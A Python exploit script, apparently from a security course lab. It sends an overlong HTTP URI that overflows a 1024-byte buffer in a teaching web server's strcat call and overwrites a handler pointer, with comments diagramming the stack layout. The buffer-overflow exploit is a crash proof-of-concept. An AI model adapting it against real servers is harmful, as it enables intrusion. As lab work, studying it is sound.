#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

# EXPLOIT TARGETED:
#
# [http.c:276]
# The "char pn[1024]" variable may be overflown when used in the function
# "strcat", which is called on line 281:
#
#     <strcat(pn, name);>
#
# The argument "name" is the HTTP request URI, which has been set as an environment
# variable previously. As explained in the previous vulnerabilities, this URI could
# be much larger than 1024 characters long (about 8000) and could overflow the
# "pn" buffer.
#
# We could simply make a request containing a very long URI which will overflow
# the buffer.
#
# This vulnerability can be protected using stack canaries.
#
#
# STACK LAYOUT:
# During execution of "http_serve"
#
# -----------------
# |                |
# |   return       |
# |   addr         |
# |                | <- 0xbfffde0c
#  -----------------
# |                |
# |  saved frame   | 4 bytes
# |  pointer       |
# |                | <- EBP (0xbfffde08)
#  -----------------
# |   ?            |
# |                | 4 bytes
# |                |
# |                | <- 0xbffffde04
# -----------------
# |   ?            |
# |                | 4 bytes
# |                |
# |                | <- 0xbffffde00
# -----------------
# |                |
# | void(*handler) | 4 bytes
# |                |
# |                | <- 0xbfffddfc
# -----------------
# |                |
# | char pn[1024]  |  1024 bytes
# |                |
# |                | <- 0xbfffd9fc
# -----------------
# |                |
#
# So the first 4 extra bytes overflow the handler pointer
#
#
# The first 9 bytes will already be filled with "/project1"
# So, the next 1015 bytes from the request URI will fill the buffer
# And the next 4 bytes will override the handler pointer.

def build_exploit(shellcode):
    uri_prefix  = "/"
    padding     = 1015-len(uri_prefix)
    return_addr = "BBBB"
    req = "GET " + uri_prefix + "A"*padding + return_addr + " HTTP/1.0\r\n" + "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
